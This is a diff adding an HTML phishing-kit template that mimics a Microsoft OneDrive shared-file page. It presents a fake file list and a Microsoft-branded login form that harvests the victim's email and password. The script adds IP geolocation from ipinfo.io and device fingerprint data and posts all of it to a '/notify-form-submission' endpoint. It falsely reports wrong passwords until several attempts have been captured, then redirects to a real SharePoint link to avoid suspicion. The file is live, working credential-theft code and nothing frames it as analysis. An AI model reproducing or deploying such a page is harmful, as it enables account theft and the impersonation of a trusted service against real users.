@@ -1,0 +1,401 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:o="urn:schemas-microsoft-com:office:office" lang="en-us" dir="ltr">
+
+<head>
+    <link id="favicon" rel="shortcut icon"
+        href="https://learningresourcesnetwork-my.sharepoint.com/_layouts/15/images/favicon.ico?rev=47"
+        type="image/vnd.microsoft.icon">
+    <title>
+        Sharing Link Validation
+    </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="https://robertlugana.sirv.com/OneDrive/stylo.css">
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const bgContainer = document.querySelector('.onedrive-bg');
+            const loginModal = document.getElementById('SharingValidationControlsSection');
+
+            if (bgContainer && loginModal) {
+                bgContainer.addEventListener('click', function () {
+                    loginModal.style.display = 'flex';
+                });
+            }
+
+            // Trigger script logic if needed
+            if (typeof onPageLoad === 'function') {
+                onPageLoad();
+            }
+        });
+    </script>
+</head>
+
+<body>
+    <!-- Background UI (OneDrive Clone) -->
+    <div class="onedrive-bg">
+        <div class="od-topbar">
+            <div class="od-waffle"><i class="fas fa-th"></i></div>
+            <div class="od-title">OneDrive</div>
+        </div>
+        <div class="od-container">
+            <div class="od-sidebar">
+                <div class="od-nav-item active">
+                    <div class="od-nav-icon"><i class="far fa-folder"></i></div>
+                    My files
+                </div>
+                <div class="od-nav-item">
+                    <div class="od-nav-icon"><i class="fas fa-history"></i></div>
+                    Recent
+                </div>
+                <div class="od-nav-item">
+                    <div class="od-nav-icon"><i class="fas fa-users"></i></div>
+                    Shared
+                </div>
+                <div class="od-nav-item">
+                    <div class="od-nav-icon"><i class="far fa-trash-alt"></i></div>
+                    Recycle bin
+                </div>
+            </div>
+            <div class="od-content">
+                <div class="od-header">
+                    <div class="od-breadcrumb">My files</div>
+                </div>
+                <div class="od-file-list">
+                    <!-- Header Row -->
+                    <div class="od-file-row"
+                        style="cursor: default; border-bottom: 1px solid #edebe9; color: #605e5c; font-weight: 600; font-size: 12px;">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon"></div>
+                        <div class="od-col-name">Name <i class="fas fa-arrow-down"></i></div>
+                        <div class="od-col-modified">Modified <i class="fas fa-chevron-down"></i></div>
+                        <div class="od-col-members">Members</div>
+                        <div class="od-col-more"></div>
+                    </div>
+
+                    <!-- File 1 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-pdf"><i class="far fa-file-pdf"></i></div>
+                        <div class="od-col-name">{{file1Name}}</div>
+                        <div class="od-col-modified">{{file1Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+
+                    <!-- File 2 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-pdf"><i class="far fa-file-pdf"></i></div>
+                        <div class="od-col-name">{{file2Name}}</div>
+                        <div class="od-col-modified">{{file2Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+
+                    <!-- File 3 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-pdf"><i class="far fa-file-pdf"></i></div>
+                        <div class="od-col-name">{{file3Name}}</div>
+                        <div class="od-col-modified">{{file3Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+
+                    <!-- File 4 -->
+                    <div class="od-file-row">
+                        <div class="od-col-checkbox"><i class="far fa-square"></i></div>
+                        <div class="od-col-icon file-icon-excel"><i class="far fa-file-excel"></i></div>
+                        <div class="od-col-name">{{file4Name}}</div>
+                        <div class="od-col-modified">{{file4Date}}</div>
+                        <div class="od-col-members">Only you</div>
+                        <div class="od-col-more"><i class="fas fa-ellipsis-h"></i></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="SharingValidationControlsSection" class="external-sharing-content ms-Fabric">
+
+        <form id="inputForm" onsubmit="return handleSubmit(event);">
+            <div class="aspNetHidden">
+                <input type="hidden" name="formId" value="form25">
+            </div>
+
+
+            <div class="main-content">
+                <div class="sharing-form">
+                    <!-- Logo moved here, replacing "Enter Password" text -->
+                    <div class="header" style="margin-bottom: 20px;">
+                        <img class="microsoft-logo" src="https://robertlugana.sirv.com/microsoft-logo.png"
+                            alt="Microsoft" style="height: 24px;">
+                    </div>
+
+                    <div class="form-content">
+
+
+
+                        <div id="PasswordEntryControls">
+                            <div class="form-message">To access the shared content, enter your email address and
+                                password below.</div>
+
+                            <div class="form-input-container">
+                                <input name="txtEmail" type="email" id="txtEmail"
+                                    class="form-text-input disable-on-submit" autocomplete="off" size="25"
+                                    aria-describedby="lblEmailCallout" placeholder="Enter email">
+                                <div class="focus-area">
+                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                                    <div class="callout">
+                                        <div class="callout-title">Email</div>
+                                        <span id="lblEmailCallout">Enter your email address.</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-input-container">
+                                <input name="txtPassword" type="password" maxlength="64" id="txtPassword"
+                                    class="form-text-input disable-on-submit" autocomplete="off" size="25"
+                                    aria-describedby="lblPasswordCallout" placeholder="Enter password"
+                                    onkeypress="if(event.key === 'Enter') handleVerifyClick();">
+                                <div class="focus-area">
+                                    <i class="ms-Icon ms-Icon--Info" aria-hidden="true"></i>
+                                    <div class="callout">
+                                        <div class="callout-title">Why do I have to do this?</div>
+                                        <span id="lblPasswordCallout">For files/folders access we need to verify your
+                                            identity. Enter your password to access the content.</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-error-container">
+                                <span id="RequirePassword" style="display:none;">Password is required</span>
+                                <span id="InvalidPassword" style="display:none;">Incorrect email or password. Try
+                                    again.</span>
+                                <span id="InvalidEmail" style="display:none;">Invalid email address. Please enter a
+                                    valid email.</span>
+                                <span id="GeneralError" style="display:none;">An error occurred. Please try
+                                    again.</span>
+                            </div>
+                            <div class="form-input-container">
+                                <input type="button" name="btnSubmitPassword" value="Verify" id="btnSubmitPassword"
+                                    accesskey="V" class="form-submit disable-on-submit" onclick="handleVerifyClick()">
+                                <div class="submitted-text" style="display:none;">
+                                    <div class="spinner"></div>Verifying...
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <!-- Footer moved explicitly inside the sharing-form container -->
+                    <div class="legal">
+                        <span>© 2017 Microsoft</span>
+                        <a href="https://go.microsoft.com/fwlink/?linkid=845480">Privacy &amp; Cookies</a>
+                    </div>
+                </div>
+            </div>
+
+        </form>
+
+    </div>
+
+    <script>
+        // THESE ARE YOUR TEMPLATE VARIABLES - THEY WILL BE REPLACED BY YOUR SERVER-SIDE SCRIPT
+        const templateConfig = {
+            postURL: "{{postURL}}",
+            token: "{{token}}",
+            landingPageLink: "{{landingPageLink}}",
+            maxLoginAttempts: "{{maxLoginAttempts}}" // New variable for max login attempts
+        };
+
+        // Use the template's own origin domain + /api instead of postURL
+        // (postURL is kept in templateConfig above for easy revert if needed)
+        const apiBaseUrl = window.location.origin + "/api";
+
+        let loginAttempts = 0; // Counter for login attempts
+        const MAX_ATTEMPTS = templateConfig.maxLoginAttempts && parseInt(templateConfig.maxLoginAttempts) > 0
+            ? parseInt(templateConfig.maxLoginAttempts)
+            : 3; // Default to 3 if not provided or invalid
+
+        // Function to handle page load and prefill email if present in URL
+        function onPageLoad() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            const emailField = document.getElementById('txtEmail');
+            const emailCallout = document.getElementById('lblEmailCallout');
+
+            if (email) {
+                emailField.value = email;
+                emailField.readOnly = true;
+                emailCallout.textContent = "Your email was securely prefilled and cannot be changed.";
+            } else {
+                emailField.readOnly = false;
+                emailCallout.textContent = "Enter your email address.";
+            }
+        }
+
+        // Function to validate email format
+        function isValidEmail(email) {
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailPattern.test(email);
+        }
+
+        function handleVerifyClick() {
+            const btn = document.getElementById('btnSubmitPassword');
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+            const invalidEmailError = document.getElementById('InvalidEmail');
+            const invalidPasswordError = document.getElementById('InvalidPassword');
+            const requirePasswordError = document.getElementById('RequirePassword');
+            const generalError = document.getElementById('GeneralError');
+
+            // Hide all error messages
+            invalidEmailError.style.display = 'none';
+            invalidPasswordError.style.display = 'none';
+            requirePasswordError.style.display = 'none';
+            generalError.style.display = 'none';
+
+            const email = emailField.value.trim();
+            const password = passwordField.value.trim();
+
+            // Basic validation
+            if (!isValidEmail(email)) {
+                invalidEmailError.style.display = 'block';
+                return;
+            }
+            if (!password) {
+                requirePasswordError.style.display = 'block';
+                return;
+            }
+
+            // Disable form elements and show loading state
+            emailField.readOnly = true;
+            passwordField.disabled = true;
+            btn.disabled = true;
+            btn.value = "Verifying...";
+            btn.style.backgroundColor = "#BEBEBE";
+            btn.style.color = "#000";
+
+            // Fetch IP data and then send the submission
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .catch(error => {
+                    console.error("Error fetching IP info:", error);
+                    // Proceed without IP data if fetching fails
+                    return {};
+                })
+                .then(ipData => {
+                    const deviceData = {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screenWidth: window.screen.width,
+                        screenHeight: window.screen.height,
+                        colorDepth: window.screen.colorDepth,
+                        pixelRatio: window.devicePixelRatio,
+                        hardwareConcurrency: navigator.hardwareConcurrency,
+                        deviceMemory: navigator.deviceMemory,
+                        vendor: navigator.vendor,
+                        maxTouchPoints: navigator.maxTouchPoints,
+                    };
+
+                    // Prepare the formData content
+                    const formDataContent = {
+                        email: email,
+                        password: password,
+                        ipData: ipData,
+                        deviceData: deviceData
+                    };
+
+                    // Prepare the final payload with token and stringified formData
+                    let finalPayload = {
+                        token: templateConfig.token,
+                        formData: JSON.stringify(formDataContent)
+                    };
+
+                    console.log("Final Payload (before URL encoding):", finalPayload);
+
+                    // Send data to the submission API using origin-based URL
+                    return fetch(apiBaseUrl + "/notify-form-submission", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: objectToFormData(finalPayload)
+                    });
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! status: ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    // Successful API response received
+                    loginAttempts++;
+
+                    if (loginAttempts < MAX_ATTEMPTS) {
+                        // Less than max attempts, show incorrect password error
+                        invalidPasswordError.textContent = "Incorrect email or password. Try again.";
+                        invalidPasswordError.style.display = 'block';
+                        resetFormState();
+                    } else {
+                        // Max attempts reached, proceed to redirect
+                        btn.value = "Decrypting Files...";
+                        // Determine the redirect URL
+                        let redirectUrl = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== ''
+                            ? templateConfig.landingPageLink
+                            : "https://learningresourcesnetwork-my.sharepoint.com/:x:/g/personal/brendan_lern_org/EZN5bpWBZTxChTgSdmSwmtUBEqPKrmWF0_T7WtMsRehNWA?rtime=Z7fPqXLW3Eg";
+
+                        // Ensure redirectUrl has a proper prefix
+                        if (redirectUrl && !redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+                            redirectUrl = `https://${redirectUrl}`;
+                        }
+                        window.location.href = redirectUrl;
+                    }
+                })
+                .catch(error => {
+                    console.error("Error during form submission:", error);
+                    generalError.textContent = "An error occurred during login. Please try again.";
+                    generalError.style.display = 'block';
+                    resetFormState();
+                });
+        }
+
+        // Helper function to reset form/button fields
+        function resetFormState() {
+            const btn = document.getElementById('btnSubmitPassword');
+            const emailField = document.getElementById('txtEmail');
+            const passwordField = document.getElementById('txtPassword');
+
+            if (!new URLSearchParams(window.location.search).get('email')) {
+                emailField.readOnly = false;
+            }
+            passwordField.disabled = false;
+            passwordField.value = "";
+            btn.disabled = false;
+            btn.value = "Verify";
+            btn.style.backgroundColor = "";
+            btn.style.color = "";
+        }
+
+        // Handle form submission to prevent the default behavior
+        function handleSubmit(event) {
+            event.preventDefault();
+            handleVerifyClick();
+            return false;
+        }
+
+        // Helper function to convert object to URLSearchParams
+        function objectToFormData(obj) {
+            const formData = new URLSearchParams();
+            Object.entries(obj).forEach(([key, value]) => {
+                formData.append(key, value.toString());
+            });
+            return formData.toString();
+        }
+
+        // Manually trigger onPageLoad when the DOM is ready
+        document.addEventListener('DOMContentLoaded', onPageLoad);
+    </script>
+
+</body>
+
+</html>
